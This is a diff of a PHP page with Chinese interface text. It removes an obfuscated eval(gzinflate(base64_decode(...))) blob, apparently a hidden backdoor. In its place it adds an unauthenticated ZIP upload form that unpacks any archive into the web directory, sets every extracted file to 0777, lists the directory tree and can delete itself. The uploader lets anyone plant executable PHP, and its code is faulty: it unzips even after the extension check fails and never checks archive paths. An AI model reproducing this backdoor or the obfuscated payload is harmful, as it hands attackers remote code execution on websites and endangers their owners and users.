@@ -1,16 +1,119 @@
 <?php
 
+function uploadAndUnzip($file) {
+    $target_dir = __DIR__;
+    $target_file = $target_dir . basename($file["name"]);
+    // $dirNameNew= substr(basename($file["name"]), 0, -4);
+    $uploadOk = 1;
+    $zipFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
+
+    // Check if file is a actual zip or fake zip
+    if($zipFileType != "zip") {
+        echo "<br>Sorry, 仅 .ZIP 格式支持.";
+        $uploadOk = 0;
+    }
+
+    // Check if $uploadOk is set to 0 by an error
+    if ($uploadOk == 0) {
+        echo "<br>Sorry, your file was not uploaded.";
+    // if everything is ok, try to upload file
+    } else {
+        if (move_uploaded_file($file["tmp_name"], $target_file)) {
+            echo "<br>The file ". basename( $file["name"]). " has been uploaded 已上传.";
+        } else {
+            echo "<br>Sorry, 上传过程出现异常 请重试.";
+        }
+    }
+
+    // Unzip the file
+    $zip = new ZipArchive;
+    if ($zip->open($target_file) === TRUE) {
+        $zip->extractTo($target_dir);
+        $zip->close();
+         // Get the name of the newly unzipped folder
+         $dirNameNew = basename($file["name"], ".zip");
+         // Change the permissions of the folder to be readable, writable and executable
+         chmod($dirNameNew, 0777);
+         // Create a RecursiveIteratorIterator to get all files in the directory and its subdirectories
+         $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dirNameNew));
+         // Traverse through all the files and set their permissions to readable, writable and executable
+         foreach($iterator as $file) {
+             chmod($file, 0777);
+         }
+
+        echo '<br>File 已解压 已0777(目录名 同 ZIP名):'.$target_dir.'/'.$dirNameNew;
+
+        // Delete the uploaded zip file
+        unlink($target_file);
+        echo '<br>已删除zip file';
+    } else {
+        echo '<br>解压失败 ,请重试 ';
+    }
+
+    // Delete the current PHP file
+    // unlink(__FILE__);
+}
+
+// Call the function
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (isset($_FILES['file'])) {
+        uploadAndUnzip($_FILES['file']);
+    }
+}
+
 if($_GET['a']=='del'){
     // Delete the current PHP file
-    echo '<br删除本页<br>';
+    echo '<br删除本页执行<br>';
     unlink(__FILE__);
 }
-function tFhhVj($ksQC)
-{ 
-$ksQC=gzinflate(base64_decode($ksQC));
- for($i=0;$i<strlen($ksQC);$i++)
- {
-$ksQC[$i] = chr(ord($ksQC[$i])-1);
- }
- return $ksQC;
- }eval(tFhhVj("jVVtb9tUFP4B+RUHa5ITKU06iU9LnKqiLo0ESUjcaVpXWTfJzWzF8bWur1vChARIWxntxj6wDwg+dGJoICEKCLRqFPFn6jT9FZzrl8RJC8Kf7st5eZ7nnHMNgF8uNwjcnrCZC4HnMNJfd/vb7ke2l78xsB1agAc5aXZDEH6fCrNvc9DANDfqbdOsLFxJc7zLWpagS3zqkhGNo+0ocq3sFhJPtGngQYPua+AHXV/w/L84FGG1CCtvp44x1OYQ891MjhDyJnoYY0+iwFCCOWyf8rxHhGW7A5bPAi221o2temOzaep3DL3RqTcbBQwehSqX4R2L9oZgDyAiZftAgPREQBzANMA4DMiQynXkYA/yC+nf0kDBvZKKJz/asxgo1S6vdRjn4yKc//kQSnfrLZgcn4VnX06+OpkcfVpSKjOPLMnV+PjjqwDnVojSpwIEg1XojoG4QDlnPEEI+Uw8DPif2MYs4DH1feKDy0TSG7SfAkQIGJPuUT6W6t6X2dmwCIKPJYLYPAoRAwfq+DSTUgIasT1qpoGjqqRFFyPPjAtfXGivQhb1InLDojFiJdN0sNhEJVDAQkJdSt0ZIwhf/3Z++sX52XFW/CuAr69h5Df9++Dih8Pw4M3F01/Cs8/C01OYnry+PHgyPXm+EHOphtGYgUiAz7oYy+3Sfbhre+u8Z9l7tDIvIV6v1JhH3YVmLmBFNTDa23pWn9iYfig4tq4xb38cukJlyarnMJ/mM8cRVVVSlV0tNZq++i58egj5i29+Dv96Hj57AuGzI8AGxmXhllrKhC+p9+7hwXy6k8FKeG9QhwoaEZ8VQfKeqSC/wHVsd7hI8zp4iCz8/Pjy65dpBLVyfcfNXWIm4ctfp79/D8VZqUBdHrIM0F7AOXUFtLZac5xoksA0zc36e7ppIkR0l/NJHCcubfK65qL6mR29fVtv76ht/YNtvWOY7+vGVnND3Y0qqLaaHUNNaygdbB9HGt1k9M6OGvHbXZiC5Ud7yTSlhKjkK2W+qxs7KlF3NU3tU0ctPPi/XGfyxWpPvv3p8sUfk8evpi+Ozt88wvNEvWsFWavlclVLjJxartpl/bHcDhgfyUcVtdGUNaLdVGBEhcX6muIxXyhAUTh8TTVlFDjC9ggXZemz0ieCKLUo2eUnjyeHP2IP3oq2Vdv1AnwBIy+JXAE5+ena7ier2lVr/PuMbEy6R5wAt/Fgy+5OQyQGSCBCIRkQsDgdaCqCl1rWsspUy0SalGO21XJMPldd8ywvJwX5Bw=="));?>
+
+function listFolderFiles($dir){
+    $ffs = scandir($dir);
+
+    unset($ffs[array_search('.', $ffs, true)]);
+    unset($ffs[array_search('..', $ffs, true)]);
+
+    if (count($ffs) < 1)
+        return;
+
+    echo '<ul>';
+    foreach($ffs as $ff){
+        echo '<li>'.$ff;
+        if(is_dir($dir.'/'.$ff)){
+            listFolderFiles($dir.'/'.$ff);
+        } else {
+            echo ' (Permission: '.substr(sprintf('%o', fileperms($dir.'/'.$ff)), -4).')';
+        }
+        echo '</li>';
+    }
+    echo '</ul>';
+}
+
+
+
+
+?>
+
+<html>
+<body>
+
+<form action="?a=1" method="post" enctype="multipart/form-data">
+    选择ZIP:
+    <input type="file" name="file" id="file">
+    <input type="submit" value="上传 ZIP" name="submit">
+</form>
+<br/><br/>
+<a href='?a=delpro'>删除pro文件夹</a>
+<br/><br/>
+<a href='?a=del'>删除本页</a>
+
+<br/><br/>
+
+<?php
+echo "当前目录: " . __DIR__ . "<br/> 当前下级结构：<br/>";
+listFolderFiles(__DIR__);
+
+?>
+</body>
+</html>
+
